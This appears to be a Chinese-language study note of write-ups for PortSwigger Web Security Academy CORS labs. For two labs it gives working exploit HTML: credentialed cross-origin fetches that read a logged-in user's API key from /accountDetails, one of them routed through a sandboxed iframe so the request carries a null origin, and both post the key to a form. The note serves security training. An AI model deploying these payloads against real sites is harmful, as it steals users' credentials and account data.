---
title: PortSwigger Cross-origin resource sharing (CORS)
description: PortSwigger Cross-origin resource sharing (CORS)
last_update:
  date: "2025-08-25T08:00:00+08:00"
---

## Lab: CORS vulnerability with basic origin reflection

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header |
| Lab       | https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack                               |

在 exploit-server 構造

```html
<script>
  fetch(
    "https://0ae00026030c463780b68f5900490011.web-security-academy.net/accountDetails",
    { credentials: "include" },
  )
    .then((res) => res.json())
    .then((json) => {
      alert(JSON.stringify(json));
      document.getElementById("hello").value = json.apikey;
      document.getElementById("submitSolution").submit();
    });
</script>
<form
  id="submitSolution"
  action="/submitSolution"
  method="POST"
  enctype="application/x-www-form-urlencoded"
>
  <input id="hello" name="answer" />
</form>
```

## Lab: CORS vulnerability with trusted null origin

| Dimension | Description                                                                  |
| --------- | ---------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#whitelisted-null-origin-value      |
| Lab       | https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack |

在 exploit-server 構造

```html
<iframe
  id="evilIframe"
  sandbox="allow-scripts allow-top-navigation allow-forms"
></iframe>
<script>
  const inlineHTML = `
<div>
  <script>
    fetch('https://0ab4000a04978dfe81a60340003600c0.web-security-academy.net/accountDetails', {
      credentials : 'include'
    })
      .then(res => res.json())
      .then(json => {
        document.getElementById("hello").value = json.apikey;
        document.getElementById("submitSolution").submit();
      })
  <\/script>
  <form
    id="submitSolution"
    action="https://0ab4000a04978dfe81a60340003600c0.web-security-academy.net/submitSolution"
    method="POST"
    enctype="application/x-www-form-urlencoded"
  >
    <input id="hello" name="answer" />
  </form>
</div>`;
  document.getElementById("evilIframe").setAttribute("srcdoc", inlineHTML);
</script>
```

中間有遇到一個小問題，在 `<script>` 標籤內的 template literal 定義 `<script>`

```html
<script>
  // 這樣會出錯
  const html = `<script>alert(1);</script>`;
</script>

<script>
  // 這樣就沒問題
  const html = `<script>alert(1);<\/script>`;
</script>
```

## Lab: CORS vulnerability with trusted insecure protocols

| Dimension | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#breaking-tls-with-poorly-configured-cors |
| Lab       | https://portswigger.net/web-security/cors/lab-breaking-https-attack                |

## 參考資料

- https://portswigger.net/web-security/cors
